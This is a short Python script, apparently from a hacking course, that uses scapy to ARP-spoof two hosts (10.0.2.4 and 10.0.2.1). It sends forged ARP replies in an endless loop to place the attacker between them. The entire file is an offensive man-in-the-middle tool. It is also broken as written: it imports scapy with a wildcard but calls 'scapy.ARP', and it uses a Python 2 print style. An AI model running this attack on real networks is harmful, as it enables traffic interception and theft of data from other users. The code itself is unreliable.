#!/usr/bin/env python
from scapy.all import *
# import scapy.all as scapy
import time
# import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # print(arp_request.summary())
    # scapy.ls(scapy.ARP()) this is to see which parameters does scapy.ARP() accepts and how
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.summary())
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered_list.summary())


    for element_is_variable in answered_list:

        return element_is_variable[1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

sent_packets_count=0

while True:
    spoof("10.0.2.4", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.4")
    sent_packets_count = sent_packets_count + 2
    print("\r[+]Packets Sent: " + str(sent_packets_count)),
    # sys.stdout.flush()
    time.sleep(2)

# except KeyboardInterrupt:
#     print("[+] Detected Ctrl+c ...........Quitting")